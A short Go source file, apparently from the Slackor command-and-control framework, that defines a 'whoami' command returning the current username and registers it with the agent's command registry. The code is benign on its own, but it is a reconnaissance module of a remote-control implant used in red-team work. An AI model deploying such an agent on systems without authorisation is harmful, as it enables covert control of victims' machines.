package common

import (
	"os/user"

	"github.com/Coalfire-Research/Slackor/pkg/command"
)

// WhoAmI returns the current user
type WhoAmI struct{}

// Name is the name of the command
func (s WhoAmI) Name() string {
	return "whoami"
}

// Run returns the current user
func (s WhoAmI) Run(clientID string, jobID string, args []string) (string, error) {
	user, err := user.Current()
	if err != nil {
		return "", err
	}
	return string(user.Username), nil
}

func init() {
	command.RegisterCommand(WhoAmI{})
}
